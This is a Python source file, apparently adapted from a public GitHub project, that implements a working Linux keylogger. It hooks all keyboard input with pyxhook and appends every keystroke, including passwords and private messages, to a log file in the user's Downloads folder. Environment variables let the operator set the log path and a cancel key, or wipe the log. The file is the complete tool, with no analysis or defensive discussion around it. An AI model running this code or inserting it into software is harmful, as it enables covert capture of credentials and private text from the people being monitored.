#!/usr/bin/python3
# Adapted from: https://github.com/nandydark/Linux-keylogger

import os
import pyxhook
  

log_file = os.environ.get(
    'pylogger_file',
    os.path.expanduser('/home/user/Downloads/Keylogger.txt')
)

cancel_key = ord(
    os.environ.get(
        'pylogger_cancel',
        '`'
    )[0]
)
  
if os.environ.get('pylogger_clean', None) is not None:
    try:
        os.remove(log_file)
    except EnvironmentError:
       # File does not exist, or no permissions.
        pass
  

def OnKeyPress(event):
    with open(log_file, 'a') as f:
        if event.Key == 'Return': f.write("\n")
                
        elif event.Key == 'Alt_L': f.write('{LEFT_ALT}')
        elif event.Key == 'ampersand': f.write('&')
        elif event.Key == 'apostrophe': f.write("'")
        elif event.Key == 'asciicircum': f.write('^')
        elif event.Key == 'asciitilde': f.write('~')
        elif event.Key == 'asterisk': f.write('*')
        elif event.Key == 'at': f.write('@')
        elif event.Key == 'backslash': f.write("\\")
        elif event.Key == 'BackSpace': f.write('{BACKSPACE}')
        elif event.Key == 'backtick': f.write('`')
        elif event.Key == 'bar': f.write('|')
        elif event.Key == 'braceleft': f.write('{')
        elif event.Key == 'braceright': f.write('}')
        elif event.Key == 'bracketleft': f.write('[')
        elif event.Key == 'bracketright': f.write(']')
        elif event.Key == 'Caps_Lock': f.write('{CAPS_LOCK}')
        elif event.Key == 'caret': f.write('^')
        elif event.Key == 'colon': f.write(':')
        elif event.Key == 'comma': f.write(',')
        elif event.Key == 'Control_L': f.write('{LEFT_CTRL}')
        elif event.Key == 'Control_R': f.write('{RIGHT_CTRL}')
        elif event.Key == 'Delete': f.write('{DELETE}')
        elif event.Key == 'dollar': f.write('$')
        elif event.Key == 'doublequote': f.write('"')
        elif event.Key == 'Down': f.write('{DOWN}')
        elif event.Key == 'End': f.write('{END}')
        elif event.Key == 'equal': f.write('=')
        elif event.Key == 'Escape': f.write('{ESCAPE}')
        elif event.Key == 'exclam': f.write('!')
        elif event.Key == 'grave': f.write('`')
        elif event.Key == 'greater': f.write('>')
        elif event.Key == 'hash': f.write('#')
        elif event.Key == 'Home': f.write('{HOME}')
        elif event.Key == 'Insert': f.write('{INSERT}')
        elif event.Key == 'Left': f.write('{LEFT}')
        elif event.Key == 'less': f.write('<')
        elif event.Key == 'Menu': f.write('{MENU}')
        elif event.Key == 'minus': f.write('-')
        elif event.Key == 'Next': f.write('{PAGE_DOWN}')
        elif event.Key == 'numbersign': f.write('#')
        elif event.Key == 'Page_Up': f.write('{PAGE_UP}')
        elif event.Key == 'parenleft': f.write('(')
        elif event.Key == 'parenleft':f.write('(')
        elif event.Key == 'parenright': f.write(')')
        elif event.Key == 'Pause': f.write('{PAUSE}')
        elif event.Key == 'percent': f.write('%')
        elif event.Key == 'period': f.write('.')
        elif event.Key == 'pipe': f.write('|')
        elif event.Key == 'plus': f.write('+')
        elif event.Key == 'Print': f.write('{PRINT}')
        elif event.Key == 'question': f.write('?')
        elif event.Key == 'quotedbl': f.write('"')
        elif event.Key == 'quote': f.write("'")
        elif event.Key == 'Right': f.write('{RIGHT}')
        elif event.Key == 'Scroll_Lock': f.write('{SCROLL_LOCK}')
        elif event.Key == 'semicolon': f.write(';')
        elif event.Key == 'Shift_L': f.write('{LEFT_SHIFT}')
        elif event.Key == 'Shift_R': f.write('{RIGHT_SHIFT}')
        elif event.Key == 'slash': f.write('/')
        elif event.Key == 'space': f.write(' ')
        elif event.Key == 'Super_L': f.write('{LEFT_WIN}')
        elif event.Key == 'Super_R': f.write('{RIGHT_WIN}')
        elif event.Key == 'Tab': f.write('{TAB}')
        elif event.Key == 'tilde': f.write('~')
        elif event.Key == 'underscore': f.write('_')
        elif event.Key == 'Up': f.write('{UP}')

        elif event.Key == '[269025045]': f.write('{VOL_UP}')
        elif event.Key == '[269025046]': f.write('{VOL_DOWN}')

        # Log all other keypresses whose name is not a single character
        # as "{KEY_NAME}".
        elif len(event.Key) > 1: 
            key_name = str('{}'.format(event.Key)).upper()
            f.write('{' + key_name + '}')

        # Handle all other single-character keys.
        else: f.write('{}'.format(event.Key))
  

new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
new_hook.HookKeyboard()
try:
    new_hook.start()
except KeyboardInterrupt:
    pass
except Exception as ex:
    msg = 'Error while catching events:  {}'.format(ex)
    pyxhook.print_err(msg)
    with open(log_file, 'a') as f:
        f.write('{}'.format(msg))
